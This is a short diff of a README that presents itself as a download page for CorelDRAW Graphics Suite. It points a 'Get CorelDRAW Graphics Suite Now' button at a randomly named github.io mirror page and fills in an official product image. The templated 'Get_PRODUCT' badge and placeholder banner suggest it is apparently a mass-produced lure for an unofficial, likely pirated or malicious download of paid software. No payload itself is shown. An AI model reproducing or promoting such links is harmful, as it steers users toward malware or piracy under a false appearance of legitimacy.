@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://i.ytimg.com/vi/YZKrCzOI6lA/maxresdefault.jpg)
 
-[![Get CorelDRAW Graphics Suite Now](https://img.shields.io/badge/Get_PRODUCT-Now-0a5d8d?style=for-the-badge&logo=github)](Coreldraw Graphics Suite Software)
+[![Get CorelDRAW Graphics Suite Now](https://img.shields.io/badge/Get_PRODUCT-Now-0a5d8d?style=for-the-badge&logo=github)](https://mirrorcaramelscooterlgxid909.github.io/.github/Coreldraw-Graphics-Suite-Software)
 
 ---
 
@@ -42,7 +42,7 @@ CorelDRAW Graphics Suite Software distinguishes itself through its broad collect
 
 ## What It Looks Like
 
-![Interface](Foto)
+![Interface](https://www.coreldraw.com/static/cdgs/images/learn/tutorials/new-in-march-2026/generate-image-document-coreldraw-graphics-suite.png)
 
 ---
 
